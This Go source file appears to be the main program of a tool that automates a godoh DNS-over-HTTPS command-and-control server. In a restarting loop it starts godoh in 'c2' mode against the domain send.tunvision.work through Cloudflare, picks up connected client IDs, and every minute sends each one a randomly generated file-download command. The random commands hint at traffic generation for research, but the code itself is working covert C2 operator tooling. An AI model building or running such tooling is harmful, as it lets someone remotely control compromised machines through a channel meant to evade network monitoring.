package main

import (
	"go-godoh-proxy/child"
	"go-godoh-proxy/godoh"
	"go-godoh-proxy/grater"
	"go-godoh-proxy/logger"
	"time"
)

func main() {
	for {
		// 创建godoh c2客户端
		p, err := child.CreateChildProcess(`godoh`, "c2", "-d", "send.tunvision.work", "-p", "cloudflare")
		if err != nil {
			logger.Log("What happened? ", err, "WaitExit")
			time.Sleep(3 * time.Second)
			continue
		}
		logger.Log("子进程创建成功")
		p.Run(func(stream *child.IOStream) {
			isRunning := true
			//设置每隔一段时间执行的命令
			logger.Log("系统启动")
			//创建一个逐行扫描识别器，该识别器用于识别godoh的输出获得连接的客户端的id
			i := godoh.NewIdentityReader(stream)
			//每隔一段时间执行回调的内容
			go i.SyncHandleOnBallingOrTimeout(60*time.Second, func(identity string) {
				//identity为已连接客户端的id
				logger.Log("当前已连接客户端：" + identity)
				logger.Log("正在处理 " + identity)
				i.Use(identity)
				time.Sleep(2 * time.Second) //DO NOT DELETE
				//随机生成一条下载文件的命令
				cmd := grater.MakeFileTransferCommand()
				logger.Log("执行命令：" + cmd)
				i.Run(cmd)
			}, &isRunning)
			//监听godoh的输出，使用逐行扫描器处理客户端的连接操作
			godoh.SyncListen(stream, []godoh.LineReader{i})
		})
		logger.Log("初始化完成")
		p.WaitExit()
		logger.Log("Server Closed,Restarting..")
	}
}
